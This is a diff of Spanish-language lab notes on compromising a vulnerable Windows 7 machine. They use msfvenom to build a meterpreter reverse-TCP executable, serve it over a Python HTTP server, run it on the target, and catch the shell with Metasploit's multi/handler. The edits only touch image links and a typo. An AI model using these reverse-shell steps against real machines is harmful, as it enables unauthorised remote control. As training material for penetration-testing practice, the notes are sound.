@@ -6,19 +6,21 @@ Vamos a practicar en una maquina Windows 7 vulnerable.
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP_ATACANTE) LPORT=4444 -f exr -o (NOMBRE_ARCHIVO_CREADO)
 ```
-![[Pasted image 20250112145720.png]]
+
+![](../Imagenes/Pasted%20image%2020250112145720.png)
 - Esta la posibilidad que nos tire un error con relación a los bits, para solucionarlo tenemos que modificar el comando.
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP_ATACANTE) LPORT=4444 -f exr -o (NOMBRE_ARCHIVO_CREADO)
 ```
 - Agregamos /x64/.
-- Ya que lo tenemos, lo vamos a compartir por un servidor echo en Paython.
+- Ya que lo tenemos, lo vamos a compartir por un servidor creado en Paython.
 ```
 python3 -m http.server 80
 ```
 ![[Pasted image 20250112150214.png]]
 - Ahora, en la maquina windows ponemos la IP de la maquina atacante en la URL.
-![[Pasted image 20250112150311.png]]
+
+![](../Imagenes/Pasted%20image%2020250112150311.png)
 - Descargamos el archivo virus.
 - Ahora, abrimos ==metasploit== para ponernos en escucha.
 - Para abrir el ==metasploit== en la consola usamos el comando `msfconsole`.
@@ -27,16 +29,20 @@ python3 -m http.server 80
 use /multi/handler
 ```
 - Que cumple la función de ==nc==.
-![[Pasted image 20250112150659.png]]
+
+![](../Imagenes/Pasted%20image%2020250112150659.png)
 - Ya con este payloads vamos a configurarlo con el comando `show options` y vamos a rellenar con la información faltante.
-![[Pasted image 20250112150841.png]]
+
+![](../Imagenes/Pasted%20image%2020250112150841.png)
 - Ahora nos falta modificar el payload como tal, usamos el comando `set PAYLOAD` y ponemos el payload que creamos en msfvenom.
-![[Pasted image 20250112151054.png]]
+![](../Imagenes/Pasted%20image%2020250112151054.png)
 - Ahora hacemos ==run== en el payload y en windows ejecutamos el programa virus.
-![[Pasted image 20250112151222.png]]
+
+![](../Imagenes/Pasted%20image%2020250112151222.png)
 - Estamos dentro.
 - Estando dentro vamos a usar el comando `background`.
-![[Pasted image 20250112151407.png]]
+
+![](../Imagenes/Pasted%20image%2020250112151407.png)
 - Este comando permite una sesión activa de meterpreter a fondo, permite que el operador regrese al prompt principal de metasploit (msf) para ejecutar otros comandos o iniciar nuevas sesiones.
 - ==Metasploit== tiene un payload que automatiza la búsqueda de sploit que nos permite escalar privilegios.
 ```
